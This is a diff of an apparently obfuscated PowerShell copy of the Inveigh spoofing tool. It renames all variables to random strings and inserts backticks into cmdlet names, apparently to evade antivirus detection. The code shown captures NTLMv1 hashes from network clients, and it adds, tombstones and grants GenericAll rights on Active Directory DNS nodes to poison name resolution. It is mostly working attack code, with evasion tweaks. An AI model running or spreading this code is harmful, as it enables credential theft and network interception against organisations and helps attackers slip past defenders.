+                                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[!] [$(Get-Date -format s)] SMB($lyBceglOUxojIJcWfJXdIrHkrTxJoyYtvaYwJcHIJ) NTLMv1 written to " + "Inveigh-kjvPVCdFXuxSuyUrLYKXNGfiFNSGTLrUegmqtfkuLYrT.txt") > $null
                             }
 
-                            if($LightOval.NTLMv1_username_list -notcontains "$RiddlePizzas $BrushSuck\$BestFluffy")
+                            if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv1_username_list -notcontains "$eNxwacaDJketGfaRHfQquIMMhYoskbVA $ZpnLVmwNsGclFFvEWrMnTIZiSnNo\$ifeLVhWLzSJcyRyKCvFFmcnO")
                             {
-                                $LightOval.NTLMv1_username_list.Add("$RiddlePizzas $BrushSuck\$BestFluffy") > $null
+                                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv1_username_list.Add("$eNxwacaDJketGfaRHfQquIMMhYoskbVA $ZpnLVmwNsGclFFvEWrMnTIZiSnNo\$ifeLVhWLzSJcyRyKCvFFmcnO") > $null
                             }
 
-                            if($LightOval.IP_capture_list -notcontains $RiddlePizzas -and -not $BestFluffy.EndsWith('$') -and !$LightOval.spoofer_repeat -and $RiddlePizzas -ne $SmashDolls)
+                            if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.IP_capture_list -notcontains $eNxwacaDJketGfaRHfQquIMMhYoskbVA -and -not $ifeLVhWLzSJcyRyKCvFFmcnO.EndsWith('$') -and !$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.spoofer_repeat -and $eNxwacaDJketGfaRHfQquIMMhYoskbVA -ne $vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS)
                             {
-                                $LightOval.IP_capture_list.Add($RiddlePizzas) > $null
+                                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.IP_capture_list.Add($eNxwacaDJketGfaRHfQquIMMhYoskbVA) > $null
                             }
 
                         }
                         else
                         {
-                            $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] $ClassySquash($SlipPorter) NTLMv1 ignored for $BrushSuck\$BestFluffy from $RiddlePizzas($TryHole)`:$HollowThick`:`n[machine account]") > $null    
+                            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] [$(Get-Date -format s)] $KjgVwuAzvAqgflsiyLKEOOdznSLkaIokq($lyBceglOUxojIJcWfJXdIrHkrTxJoyYtvaYwJcHIJ) NTLMv1 ignored for $ZpnLVmwNsGclFFvEWrMnTIZiSnNo\$ifeLVhWLzSJcyRyKCvFFmcnO from $eNxwacaDJketGfaRHfQquIMMhYoskbVA($hHVgAJWodJrXiWnhRSOAYhHrcPiGogI)`:$cjZpBGhKUHaTEXIBrvNWUB`:`n[machine account]") > $null    
                         }
 
                     }
                     else
                     {
-                        $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] $ClassySquash($SlipPorter) NTLMv1 ignored for $BrushSuck\$BestFluffy from $RiddlePizzas($TryHole)`:$HollowThick`:`n[capture disabled]") > $null    
+                        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] [$(Get-Date -format s)] $KjgVwuAzvAqgflsiyLKEOOdznSLkaIokq($lyBceglOUxojIJcWfJXdIrHkrTxJoyYtvaYwJcHIJ) NTLMv1 ignored for $ZpnLVmwNsGclFFvEWrMnTIZiSnNo\$ifeLVhWLzSJcyRyKCvFFmcnO from $eNxwacaDJketGfaRHfQquIMMhYoskbVA($hHVgAJWodJrXiWnhRSOAYhHrcPiGogI)`:$cjZpBGhKUHaTEXIBrvNWUB`:`n[capture disabled]") > $null    
                     }
 
                 }
                 else
                 {
-                    $LightOval.output_queue.Add("[-] [$(Get-Date -format s)] $ClassySquash($SlipPorter) NTLMv1 challenge missing for $BrushSuck\$BestFluffy from $RiddlePizzas($TryHole)`:$HollowThick") > $null    
+                    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[-] [$(Get-Date -format s)] $KjgVwuAzvAqgflsiyLKEOOdznSLkaIokq($lyBceglOUxojIJcWfJXdIrHkrTxJoyYtvaYwJcHIJ) NTLMv1 challenge missing for $ZpnLVmwNsGclFFvEWrMnTIZiSnNo\$ifeLVhWLzSJcyRyKCvFFmcnO from $eNxwacaDJketGfaRHfQquIMMhYoskbVA($hHVgAJWodJrXiWnhRSOAYhHrcPiGogI)`:$cjZpBGhKUHaTEXIBrvNWUB") > $null    
                 }
 
             }
-            elseif($LastCrabby -eq 0)
+            elseif($haAjbFEHHgIQIbuDsngztk -eq 0)
             {
-                $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] $ClassySquash($SlipPorter) NTLM null response from $RiddlePizzas($TryHole)`:$HollowThick") > $null
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] [$(Get-Date -format s)] $KjgVwuAzvAqgflsiyLKEOOdznSLkaIokq($lyBceglOUxojIJcWfJXdIrHkrTxJoyYtvaYwJcHIJ) NTLM null response from $eNxwacaDJketGfaRHfQquIMMhYoskbVA($hHVgAJWodJrXiWnhRSOAYhHrcPiGogI)`:$cjZpBGhKUHaTEXIBrvNWUB") > $null
             }
 
-            Invoke-SessionUpdate $BrushSuck $BestFluffy $TryHole $StuffSky
+            Invoke-SessionUpdate $ZpnLVmwNsGclFFvEWrMnTIZiSnNo $ifeLVhWLzSJcyRyKCvFFmcnO $hHVgAJWodJrXiWnhRSOAYhHrcPiGogI $thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd
         }
 
     }
@@ -1781,7 +1781,7 @@ $UppitySheep =
 }
 
 # Microsoft".
-$StreetFound =
+$hbLMHnQegNxGhBNPKzkwhonMNWEuycgdyJLrBxt =
 {
 
     function Disable-ADIDNSNode
@@ -1790,59 +1790,59 @@ $StreetFound =
         [CmdletBinding()]
         param
         (
-            [parameter(Mandatory=$false)][String]$DesireUnique,
-            [parameter(Mandatory=$false)][String]$TrickWander,
-            [parameter(Mandatory=$true)][String]$FilmJazzy,
-            [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones")][String]$CauseYoke = "DomainDNSZones",
-            [parameter(Mandatory=$false)][String]$PersonCheer,
+            [parameter(Mandatory=$false)][String]$ftdOWSOcDehtsWbWJMmkJCJyNuiNOXANQcrKTay,
+            [parameter(Mandatory=$false)][String]$oOKRVkPmhffpDSkVLIFGzJKYJ,
+            [parameter(Mandatory=$true)][String]$ifczfhVhxXUsXrLMmesQQ,
+            [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones")][String]$zgPBavHAgJDNXciLWtpacZIBhUFjXbA = "DomainDNSZones",
+            [parameter(Mandatory=$false)][String]$SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC,
             [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential
         )
 
-        $DonkeyFrail = New-DonkeyFrail -TrickWander $TrickWander -PersonCheer $PersonCheer
+        $OsmYZXCshtqjAUQpMNVOdOrwX = New-OsmYZXCshtqjAUQpMNVOdOrwX -oOKRVkPmhffpDSkVLIFGzJKYJ $oOKRVkPmhffpDSkVLIFGzJKYJ -SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC $SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC
 
-        $GaudySoothe = "DC=$FilmJazzy,DC=$PersonCheer,CN=MicrosoftDNS,DC=$CauseYoke"
-        $BrickOwn = $DesireUnique.Split(".")
+        $UMlVzDlwSFqGkUcSAGJlrwbAtwGPLZj = "DC=$ifczfhVhxXUsXrLMmesQQ,DC=$SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC,CN=MicrosoftDNS,DC=$zgPBavHAgJDNXciLWtpacZIBhUFjXbA"
+        $QXPUUGTvFvsgCDcBGJhjxfcVwrNhmoIPqrJGcaCCMql = $ftdOWSOcDehtsWbWJMmkJCJyNuiNOXANQcrKTay.Split(".")
 
-        foreach($NiceFree in $BrickOwn)
+        foreach($DjOefovaOWFeXyBLnlKhffMNEyjuu in $QXPUUGTvFvsgCDcBGJhjxfcVwrNhmoIPqrJGcaCCMql)
         {
-            $GaudySoothe += ",DC=$NiceFree"
+            $UMlVzDlwSFqGkUcSAGJlrwbAtwGPLZj += ",DC=$DjOefovaOWFeXyBLnlKhffMNEyjuu"
         }
 
         if($Credential)
         {
-            $TownPack = ne`w-`obje`ct System.DirectoryServices.DirectoryEntry("LDAP://$TrickWander/$GaudySoothe",$Credential.UserName,$Credential.GetNetworkCredential().Password)
+            $YqSgwpzqPMLdTWynnrihWkfWgMgqRgMwrpVl = ne`w`-`ob`je`ct System.DirectoryServices.DirectoryEntry("LDAP://$oOKRVkPmhffpDSkVLIFGzJKYJ/$UMlVzDlwSFqGkUcSAGJlrwbAtwGPLZj",$Credential.UserName,$Credential.GetNetworkCredential().Password)
         }
         else
         {
-            $TownPack = ne`w-`obje`ct System.DirectoryServices.DirectoryEntry "LDAP://$TrickWander/$GaudySoothe"
+            $YqSgwpzqPMLdTWynnrihWkfWgMgqRgMwrpVl = ne`w`-`ob`je`ct System.DirectoryServices.DirectoryEntry "LDAP://$oOKRVkPmhffpDSkVLIFGzJKYJ/$UMlVzDlwSFqGkUcSAGJlrwbAtwGPLZj"
         }
 
-        $KnockHusky = [Int64](([datetime]::UtcNow.Ticks)-(Get-Date "1/1/1601").Ticks)
-        $KnockHusky = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($KnockHusky))
-        $KnockHusky = $KnockHusky.Split("-") | ForEach-Object{[System.Convert]::ToInt16($_,16)}
+        $JNVNQMwcSAgJIaPBLlXjFpQKFFJfaz = [Int64](([datetime]::UtcNow.Ticks)-(Get-Date "1/1/1601").Ticks)
+        $JNVNQMwcSAgJIaPBLlXjFpQKFFJfaz = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($JNVNQMwcSAgJIaPBLlXjFpQKFFJfaz))
+        $JNVNQMwcSAgJIaPBLlXjFpQKFFJfaz = $JNVNQMwcSAgJIaPBLlXjFpQKFFJfaz.Split("-") | ForEach-Object{[System.Convert]::ToInt16($_,16)}
 
-        [Byte[]]$PlacidHorn = 0x08,0x00,0x00,0x00,0x05,0x00,0x00,0x00 +
-            $DonkeyFrail[0..3] +
+        [Byte[]]$wILwyAWERJysCSQwSXsoSEncmrDAGBbs = 0x08,0x00,0x00,0x00,0x05,0x00,0x00,0x00 +
+            $OsmYZXCshtqjAUQpMNVOdOrwX[0..3] +
             0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
-            $KnockHusky
+            $JNVNQMwcSAgJIaPBLlXjFpQKFFJfaz
 
         try
         {
-            $TownPack.InvokeSet('dnsRecord',$PlacidHorn)
-            $TownPack.InvokeSet('dnsTombstoned',$true)
-            $TownPack.SetInfo()
-            $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] ADIDNS node $FilmJazzy tombstoned in $PersonCheer") > $null
+            $YqSgwpzqPMLdTWynnrihWkfWgMgqRgMwrpVl.InvokeSet('dnsRecord',$wILwyAWERJysCSQwSXsoSEncmrDAGBbs)
+            $YqSgwpzqPMLdTWynnrihWkfWgMgqRgMwrpVl.InvokeSet('dnsTombstoned',$true)
+            $YqSgwpzqPMLdTWynnrihWkfWgMgqRgMwrpVl.SetInfo()
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] [$(Get-Date -format s)] ADIDNS node $ifczfhVhxXUsXrLMmesQQ tombstoned in $SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC") > $null
         }
         catch
         {
             $error_message = $_.Exception.Message
             $error_message = $error_message -replace "`n",""
-            $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
         }
 
-        if($TownPack.Path)
+        if($YqSgwpzqPMLdTWynnrihWkfWgMgqRgMwrpVl.Path)
         {
-            $TownPack.Close()
+            $YqSgwpzqPMLdTWynnrihWkfWgMgqRgMwrpVl.Close()
         }
 
     }
@@ -1853,68 +1853,68 @@ $StreetFound =
         [CmdletBinding()]
         param
         (
-            [parameter(Mandatory=$false)][String]$IckyBloody,    
-            [parameter(Mandatory=$false)][String]$ChiefRate,
-            [parameter(Mandatory=$false)][String]$DesireUnique,
-            [parameter(Mandatory=$false)][String]$TrickWander,
-            [parameter(Mandatory=$true)][String]$FilmJazzy,
-            [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones")][String]$CauseYoke = "DomainDNSZones",
-            [parameter(Mandatory=$false)][ValidateSet("A","AAAA","CNAME","DNAME","MX","NS","PTR","SRV","TXT")][String]$EarBucket = "A",
-            [parameter(Mandatory=$false)][String]$PersonCheer,
-            [parameter(Mandatory=$false)][Byte[]]$StuffSnotty,
-            [parameter(Mandatory=$false)][Int]$OvertKnit,
-            [parameter(Mandatory=$false)][Int]$FemalePush,
-            [parameter(Mandatory=$false)][Int]$CobwebNeedle,
-            [parameter(Mandatory=$false)][Int]$SlipPorter,
-            [parameter(Mandatory=$false)][Int]$LethalArrive = 600,
-            [parameter(Mandatory=$false)][Int32]$SilkySelf,
-            [parameter(Mandatory=$false)][Switch]$NailMixed,
-            [parameter(Mandatory=$false)][Switch]$LiquidPetite,
+            [parameter(Mandatory=$false)][String]$eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE,    
+            [parameter(Mandatory=$false)][String]$SbRbNZHENTugWQyRptkleYHmgPaZleJRBd,
+            [parameter(Mandatory=$false)][String]$ftdOWSOcDehtsWbWJMmkJCJyNuiNOXANQcrKTay,
+            [parameter(Mandatory=$false)][String]$oOKRVkPmhffpDSkVLIFGzJKYJ,
+            [parameter(Mandatory=$true)][String]$ifczfhVhxXUsXrLMmesQQ,
+            [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones")][String]$zgPBavHAgJDNXciLWtpacZIBhUFjXbA = "DomainDNSZones",
+            [parameter(Mandatory=$false)][ValidateSet("A","AAAA","CNAME","DNAME","MX","NS","PTR","SRV","TXT")][String]$NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa = "A",
+            [parameter(Mandatory=$false)][String]$SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC,
+            [parameter(Mandatory=$false)][Byte[]]$dzGWnkfwLXsnPNxmeExtkDUrxVZlcHVZzsGvjxynnwW,
+            [parameter(Mandatory=$false)][Int]$sNnieDVGuYezMXNPmzlJOAsC,
+            [parameter(Mandatory=$false)][Int]$ykWVeBgbgsPczeylzrVhzDoRysaBlvPWKTLEA,
+            [parameter(Mandatory=$false)][Int]$fkpHmWAZEwLJIUFLssheiYzzhfVmTnDCXfsXOvJVO,
+            [parameter(Mandatory=$false)][Int]$lyBceglOUxojIJcWfJXdIrHkrTxJoyYtvaYwJcHIJ,
+            [parameter(Mandatory=$false)][Int]$SHYbFZJwSEjcXEKgEXzgBUgNkNPJtqpmcyVwW = 600,
+            [parameter(Mandatory=$false)][Int32]$FTnzKOAOPyVPZKofOcmmcHtKicxIFwhIXIbYFrKUglZ,
+            [parameter(Mandatory=$false)][Switch]$UaXElPjqMzcUmnMeccjrezf,
+            [parameter(Mandatory=$false)][Switch]$SWDKzXwOUeJstaxYWqYKFbfOh,
             [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential
         )
 
-        $GaudySoothe = "DC=$FilmJazzy,DC=$PersonCheer,CN=MicrosoftDNS,DC=$CauseYoke"
-        $BrickOwn = $DesireUnique.Split(".")
+        $UMlVzDlwSFqGkUcSAGJlrwbAtwGPLZj = "DC=$ifczfhVhxXUsXrLMmesQQ,DC=$SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC,CN=MicrosoftDNS,DC=$zgPBavHAgJDNXciLWtpacZIBhUFjXbA"
+        $QXPUUGTvFvsgCDcBGJhjxfcVwrNhmoIPqrJGcaCCMql = $ftdOWSOcDehtsWbWJMmkJCJyNuiNOXANQcrKTay.Split(".")
 
-        foreach($NiceFree in $BrickOwn)
+        foreach($DjOefovaOWFeXyBLnlKhffMNEyjuu in $QXPUUGTvFvsgCDcBGJhjxfcVwrNhmoIPqrJGcaCCMql)
         {
-            $GaudySoothe += ",DC=$NiceFree"
+            $UMlVzDlwSFqGkUcSAGJlrwbAtwGPLZj += ",DC=$DjOefovaOWFeXyBLnlKhffMNEyjuu"
         }
 
-        [Byte[]]$StuffSnotty = New-DNSRecordArray -IckyBloody $IckyBloody -TrickWander $TrickWander -EarBucket $EarBucket -LethalArrive $LethalArrive -PersonCheer $PersonCheer
+        [Byte[]]$dzGWnkfwLXsnPNxmeExtkDUrxVZlcHVZzsGvjxynnwW = New-DNSRecordArray -eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE $eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE -oOKRVkPmhffpDSkVLIFGzJKYJ $oOKRVkPmhffpDSkVLIFGzJKYJ -NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa $NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa -SHYbFZJwSEjcXEKgEXzgBUgNkNPJtqpmcyVwW $SHYbFZJwSEjcXEKgEXzgBUgNkNPJtqpmcyVwW -SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC $SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC
 
         if($Credential)
         {
-            $TownPack = ne`w-`obje`ct System.DirectoryServices.DirectoryEntry("LDAP://$TrickWander/$GaudySoothe",$Credential.UserName,$Credential.GetNetworkCredential().Password)
+            $YqSgwpzqPMLdTWynnrihWkfWgMgqRgMwrpVl = ne`w`-`ob`je`ct System.DirectoryServices.DirectoryEntry("LDAP://$oOKRVkPmhffpDSkVLIFGzJKYJ/$UMlVzDlwSFqGkUcSAGJlrwbAtwGPLZj",$Credential.UserName,$Credential.GetNetworkCredential().Password)
         }
         else
         {
-            $TownPack = ne`w-`obje`ct System.DirectoryServices.DirectoryEntry "LDAP://$TrickWander/$GaudySoothe"
+            $YqSgwpzqPMLdTWynnrihWkfWgMgqRgMwrpVl = ne`w`-`ob`je`ct System.DirectoryServices.DirectoryEntry "LDAP://$oOKRVkPmhffpDSkVLIFGzJKYJ/$UMlVzDlwSFqGkUcSAGJlrwbAtwGPLZj"
         }
 
         try
         {
-            $TownPack.InvokeSet('dnsRecord',$StuffSnotty)
-            $TownPack.SetInfo()
-            $TailRotten = $true
-            $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] ADIDNS node $FilmJazzy added to $PersonCheer") > $null;
-            $LightOval.ADIDNS_table.$FilmJazzy = "1"
+            $YqSgwpzqPMLdTWynnrihWkfWgMgqRgMwrpVl.InvokeSet('dnsRecord',$dzGWnkfwLXsnPNxmeExtkDUrxVZlcHVZzsGvjxynnwW)
+            $YqSgwpzqPMLdTWynnrihWkfWgMgqRgMwrpVl.SetInfo()
+            $aiYeWhHpYvvbdWkcHTfBIumexyD = $true
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[!] [$(Get-Date -format s)] ADIDNS node $ifczfhVhxXUsXrLMmesQQ added to $SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC") > $null;
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.ADIDNS_table.$ifczfhVhxXUsXrLMmesQQ = "1"
         }
         catch
         {
-            $TailRotten = $false
+            $aiYeWhHpYvvbdWkcHTfBIumexyD = $false
             $error_message = $_.Exception.Message
             $error_message = $error_message -replace "`n",""
-            $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
-            $LightOval.ADIDNS_table.$FilmJazzy = "0"
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.ADIDNS_table.$ifczfhVhxXUsXrLMmesQQ = "0"
         }
 
-        if($TownPack.Path)
+        if($YqSgwpzqPMLdTWynnrihWkfWgMgqRgMwrpVl.Path)
         {
-            $TownPack.Close()
+            $YqSgwpzqPMLdTWynnrihWkfWgMgqRgMwrpVl.Close()
         }
 
-        return $TailRotten
+        return $aiYeWhHpYvvbdWkcHTfBIumexyD
     }
 
     function Get-ADIDNSNodeTombstoned
@@ -1923,36 +1923,36 @@ $StreetFound =
         [CmdletBinding()]
         param
         (
-            [parameter(Mandatory=$false)][String]$ChiefRate,
-            [parameter(Mandatory=$false)][String]$DesireUnique,
-            [parameter(Mandatory=$false)][String]$TrickWander,
-            [parameter(Mandatory=$true)][String]$FilmJazzy,
-            [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones")][String]$CauseYoke = "DomainDNSZones",
-            [parameter(Mandatory=$false)][String]$PersonCheer,
+            [parameter(Mandatory=$false)][String]$SbRbNZHENTugWQyRptkleYHmgPaZleJRBd,
+            [parameter(Mandatory=$false)][String]$ftdOWSOcDehtsWbWJMmkJCJyNuiNOXANQcrKTay,
+            [parameter(Mandatory=$false)][String]$oOKRVkPmhffpDSkVLIFGzJKYJ,
+            [parameter(Mandatory=$true)][String]$ifczfhVhxXUsXrLMmesQQ,
+            [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones")][String]$zgPBavHAgJDNXciLWtpacZIBhUFjXbA = "DomainDNSZones",
+            [parameter(Mandatory=$false)][String]$SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC,
             [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential
         )
 
-        $GaudySoothe = "DC=$FilmJazzy,DC=$PersonCheer,CN=MicrosoftDNS,DC=$CauseYoke"
-        $BrickOwn = $DesireUnique.Split(".")
+        $UMlVzDlwSFqGkUcSAGJlrwbAtwGPLZj = "DC=$ifczfhVhxXUsXrLMmesQQ,DC=$SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC,CN=MicrosoftDNS,DC=$zgPBavHAgJDNXciLWtpacZIBhUFjXbA"
+        $QXPUUGTvFvsgCDcBGJhjxfcVwrNhmoIPqrJGcaCCMql = $ftdOWSOcDehtsWbWJMmkJCJyNuiNOXANQcrKTay.Split(".")
 
-        foreach($NiceFree in $BrickOwn)
+        foreach($DjOefovaOWFeXyBLnlKhffMNEyjuu in $QXPUUGTvFvsgCDcBGJhjxfcVwrNhmoIPqrJGcaCCMql)
         {
-            $GaudySoothe += ",DC=$NiceFree"
+            $UMlVzDlwSFqGkUcSAGJlrwbAtwGPLZj += ",DC=$DjOefovaOWFeXyBLnlKhffMNEyjuu"
         }
 
         if($Credential)
         {
-            $TownPack = ne`w-`obje`ct System.DirectoryServices.DirectoryEntry("LDAP://$TrickWander/$GaudySoothe",$Credential.UserName,$Credential.GetNetworkCredential().Password)
+            $YqSgwpzqPMLdTWynnrihWkfWgMgqRgMwrpVl = ne`w`-`ob`je`ct System.DirectoryServices.DirectoryEntry("LDAP://$oOKRVkPmhffpDSkVLIFGzJKYJ/$UMlVzDlwSFqGkUcSAGJlrwbAtwGPLZj",$Credential.UserName,$Credential.GetNetworkCredential().Password)
         }
         else
         {
-            $TownPack = ne`w-`obje`ct System.DirectoryServices.DirectoryEntry "LDAP://$TrickWander/$GaudySoothe"
+            $YqSgwpzqPMLdTWynnrihWkfWgMgqRgMwrpVl = ne`w`-`ob`je`ct System.DirectoryServices.DirectoryEntry "LDAP://$oOKRVkPmhffpDSkVLIFGzJKYJ/$UMlVzDlwSFqGkUcSAGJlrwbAtwGPLZj"
         }
 
         try
         {
-            $UnusedWool = $TownPack.InvokeGet('dnsTombstoned')
-            $StuffSnotty = $TownPack.InvokeGet('dnsRecord')
+            $NpOuAjyrwADoxpXCUcWHnWVVTePKEOhZhCUWT = $YqSgwpzqPMLdTWynnrihWkfWgMgqRgMwrpVl.InvokeGet('dnsTombstoned')
+            $dzGWnkfwLXsnPNxmeExtkDUrxVZlcHVZzsGvjxynnwW = $YqSgwpzqPMLdTWynnrihWkfWgMgqRgMwrpVl.InvokeGet('dnsRecord')
         }
         catch
         {
@@ -1962,34 +1962,34 @@ $StreetFound =
             {
                 $error_message = $_.Exception.Message
                 $error_message = $error_message -replace "`n",""
-                $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
             }
 
         }
 
-        if($TownPack.Path)
+        if($YqSgwpzqPMLdTWynnrihWkfWgMgqRgMwrpVl.Path)
         {
-            $TownPack.Close()
+            $YqSgwpzqPMLdTWynnrihWkfWgMgqRgMwrpVl.Close()
         }
 
-        $NiceShape = $false
+        $ukdJHqumDBPVUueuKrhJFkBipOAcRGbJYi = $false
 
-        if($UnusedWool -and $StuffSnotty)
+        if($NpOuAjyrwADoxpXCUcWHnWVVTePKEOhZhCUWT -and $dzGWnkfwLXsnPNxmeExtkDUrxVZlcHVZzsGvjxynnwW)
         {
 
-            if($StuffSnotty[0].GetType().name -eq [Byte])
+            if($dzGWnkfwLXsnPNxmeExtkDUrxVZlcHVZzsGvjxynnwW[0].GetType().name -eq [Byte])
             {
 
-                if($StuffSnotty.Count -ge 32 -and $StuffSnotty[2] -eq 0)
+                if($dzGWnkfwLXsnPNxmeExtkDUrxVZlcHVZzsGvjxynnwW.Count -ge 32 -and $dzGWnkfwLXsnPNxmeExtkDUrxVZlcHVZzsGvjxynnwW[2] -eq 0)
                 {
-                    $NiceShape = $true
+                    $ukdJHqumDBPVUueuKrhJFkBipOAcRGbJYi = $true
                 }
 
             }
 
         }
 
-        return $NiceShape
+        return $ukdJHqumDBPVUueuKrhJFkBipOAcRGbJYi
     }
 
     function Grant-ADIDNSPermission
@@ -1999,80 +1999,80 @@ $StreetFound =
         (
             [parameter(Mandatory=$false)][ValidateSet("AccessSystemSecurity","CreateChild","Delete","DeleteChild",
             "DeleteTree","ExtendedRight","GenericAll","GenericExecute","GenericRead","GenericWrite","ListChildren",
-            "ListObject","ReadControl","ReadProperty","Self","Synchronize","WriteDacl","WriteOwner","WriteProperty")][Array]$CheapRob = "GenericAll",
-            [parameter(Mandatory=$false)][ValidateSet("Allow","Deny")][String]$EarBucket = "Allow",    
-            [parameter(Mandatory=$false)][String]$ChiefRate,
-            [parameter(Mandatory=$false)][String]$DesireUnique,
-            [parameter(Mandatory=$false)][String]$TrickWander,
-            [parameter(Mandatory=$false)][String]$FilmJazzy,
-            [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones","System")][String]$CauseYoke = "DomainDNSZones",
-            [parameter(Mandatory=$false)][String]$PiesLearn,
-            [parameter(Mandatory=$false)][String]$PersonCheer,
+            "ListObject","ReadControl","ReadProperty","Self","Synchronize","WriteDacl","WriteOwner","WriteProperty")][Array]$yamkLcrvzqIaaCjhkYeBlGUuzZQDlXUdJWRjBJI = "GenericAll",
+            [parameter(Mandatory=$false)][ValidateSet("Allow","Deny")][String]$NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa = "Allow",    
+            [parameter(Mandatory=$false)][String]$SbRbNZHENTugWQyRptkleYHmgPaZleJRBd,
+            [parameter(Mandatory=$false)][String]$ftdOWSOcDehtsWbWJMmkJCJyNuiNOXANQcrKTay,
+            [parameter(Mandatory=$false)][String]$oOKRVkPmhffpDSkVLIFGzJKYJ,
+            [parameter(Mandatory=$false)][String]$ifczfhVhxXUsXrLMmesQQ,
+            [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones","System")][String]$zgPBavHAgJDNXciLWtpacZIBhUFjXbA = "DomainDNSZones",
+            [parameter(Mandatory=$false)][String]$JAnXNgAfJiWSopRPSyvLZLuDFXIfMZZxhDd,
+            [parameter(Mandatory=$false)][String]$SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC,
             [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential,
-            [parameter(ValueFromRemainingArguments=$true)]$TongueShrug
+            [parameter(ValueFromRemainingArguments=$true)]$jpNTCIxGJBVtjEdXzPhc
         )
 
-        if($CauseYoke -eq 'System')
+        if($zgPBavHAgJDNXciLWtpacZIBhUFjXbA -eq 'System')
         {
-            $GaudySoothe = "DC=$FilmJazzy,DC=$PersonCheer,CN=MicrosoftDNS,CN=$CauseYoke"
+            $UMlVzDlwSFqGkUcSAGJlrwbAtwGPLZj = "DC=$ifczfhVhxXUsXrLMmesQQ,DC=$SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC,CN=MicrosoftDNS,CN=$zgPBavHAgJDNXciLWtpacZIBhUFjXbA"
         }
         else
         {
-            $GaudySoothe = "DC=$FilmJazzy,DC=$PersonCheer,CN=MicrosoftDNS,DC=$CauseYoke"
+            $UMlVzDlwSFqGkUcSAGJlrwbAtwGPLZj = "DC=$ifczfhVhxXUsXrLMmesQQ,DC=$SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC,CN=MicrosoftDNS,DC=$zgPBavHAgJDNXciLWtpacZIBhUFjXbA"
         }
 
-        $BrickOwn = $DesireUnique.Split(".")
